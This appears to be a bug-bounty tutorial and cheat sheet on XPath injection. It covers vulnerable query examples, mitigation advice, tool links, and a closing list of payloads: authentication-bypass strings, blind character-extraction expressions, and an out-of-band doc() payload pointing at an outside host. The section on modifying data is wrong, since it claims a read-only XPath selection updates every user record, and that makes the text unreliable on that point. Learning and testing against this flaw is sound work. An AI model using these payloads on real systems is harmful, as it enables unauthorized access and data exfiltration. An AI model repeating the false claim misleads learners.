# XPATH Injection

- [Introduction](#introduction)
- [Understanding XPATH Injection](#understanding-xpath-injection)
- [The Impact of XPATH Injection](#the-impact-of-xpath-injection)
- [Common Attack Scenarios](#common-attack-scenarios)
- [Modifying Database Contents](#modifying-database-contents)
- [Tutorials for XPATH Injection](#tutorials-for-xpath-injection)
- [Payloads for XPATH Injection](#payloads-for-xpath-injection)

# Introduction:
In the realm of web security vulnerabilities, XPATH injection has emerged as a significant threat. As a bug bounty hunter or ethical hacker, understanding the intricacies of XPATH injection can prove invaluable when searching for vulnerabilities in web applications. This article delves into the details of XPATH injection, highlighting its impact, common attack scenarios, and providing examples to enhance comprehension.

## Understanding XPATH Injection:
XPATH, short for XML Path Language, is a query language used to navigate XML documents. It allows developers to extract specific data from an XML structure by defining a path to the desired elements. However, when user input is concatenated directly into an XPATH query without proper sanitization, it opens the door for potential exploitation, leading to XPATH injection vulnerabilities.

## The Impact of XPATH Injection:
XPATH injection can have severe consequences, allowing attackers to manipulate the query's execution and gain unauthorized access to sensitive information. Depending on the application's context, an attacker can extract data, modify database contents, perform administrative actions, or even execute arbitrary code. This makes XPATH injection a high-risk vulnerability that must be addressed promptly.

## Common Attack Scenarios:

### Extracting Sensitive Information:
One of the most common objectives of XPATH injection attacks is to extract sensitive data. By injecting carefully crafted XPATH expressions, an attacker can bypass authentication mechanisms or access unauthorized data. For instance, consider the following vulnerable XPATH query:

```
$query = "//user[@username='$input_username' and @password='$input_password']";

```
If an attacker supplies the input ' or 1=1 or ''=', the resulting XPATH query would become:

```
$query = "//user[@username='' or 1=1 or ''='' and @password='' or 1=1 or ''='']";


```
This would trick the query into returning all user records, compromising the system's security.

### Modifying Database Contents:
In some cases, an attacker might attempt to modify the database by injecting XPATH expressions. Suppose a vulnerable XPATH query is employed to update user details:


```
$query = "//user[@id='$input_id']/name";

```

If an attacker provides the input ' or 1=1 or ''=', the resulting XPATH query would become:

```
$query = "//user[@id='' or 1=1 or ''='']/name";


```

This would update the name attribute for all user records, allowing the attacker to manipulate data within the database.

## Mitigating XPATH Injection Vulnerabilities:
To protect web applications against XPATH injection vulnerabilities, several measures can be implemented:

#### Input Validation and Sanitization:
Ensure that all user inputs are validated and sanitized properly. Utilize input validation techniques such as whitelisting or regular expressions to filter out any malicious input.

### Parameterized Queries:
Prefer parameterized queries or prepared statements over concatenating user input directly into XPATH queries. This helps separate the query logic from user-supplied data, mitigating the risk of injection attacks.

### Least Privilege Principle:
Follow the principle of least privilege by granting minimal access rights to database users. Restricting access helps limit the potential damage that an attacker can cause if a vulnerability is exploited.

# Conclusion:
XPATH injection vulnerabilities pose a significant threat to web applications, enabling attackers to manipulate queries and gain unauthorized access to sensitive information. As a bug bounty hunter or ethical hacker, understanding XPATH injection and its potential consequences is crucial for identifying and addressing these vulnerabilities. By implementing robust input validation, utilizing parameterized queries, and adhering to the principle of least privilege, developers can effectively mitigate the risk posed by XPATH injection attacks, safeguarding web applications and user data.

### Tools for XPATH Injection

- [xcat](https://github.com/orf/xcat) - Automate XPATH Injection Attacks
- [XXXpwn](https://github.com/feakk/xxxpwn) - Advanced XPATH Injection Tool
- [xpath-blind-exlorer](https://github.com/micsoftvn/xpath-blind-explorer)
- [XmlChor](https://github.com/Harshal35/XMLCHOR) - Xpath injection exploitation tool

### Tutorials for XPATH Injection
- [What is an XPATH Injection](https://learn.snyk.io/lesson/xpath-injection/) - A good overview by Snyk
- [XPATH Injection](https://book.hacktricks.xyz/pentesting-web/xpath-injection) - Another great article by Hacktricks
- [XPATH Injection](https://owasp.org/www-community/attacks/XPATH_Injection) - A good tutorial/article by OWASP

### Payloads for XPATH Injection

Exploitation
```
' or '1'='1
' or ''='
x' or 1=1 or 'x'='y
/
//
//*
*/*
@*
count(/child::node())
x' or name()='username' or 'x'='y
' and count(/*)=1 and '1'='1
' and count(/@*)=1 and '1'='1
' and count(/comment())=1 and '1'='1
search=')] | //user/*[contains(*,'
search=Har') and contains(../password,'c
search=Har') and starts-with(../password,'c

```

Blind Exploitation
1. Size of a string
```
and string-length(account)=SIZE_INT
```
2. Extract a character
```
substring(//user[userid=5]/username,2,1)=CHAR_HERE
substring(//user[userid=5]/username,2,1)=codepoints-to-string(INT_ORD_CHAR_HERE)
```

Out of Band Exploitation
```
http://example.com/?title=Foundation&type=*&rent_days=* and doc('//10.10.10.10/SHARE')

```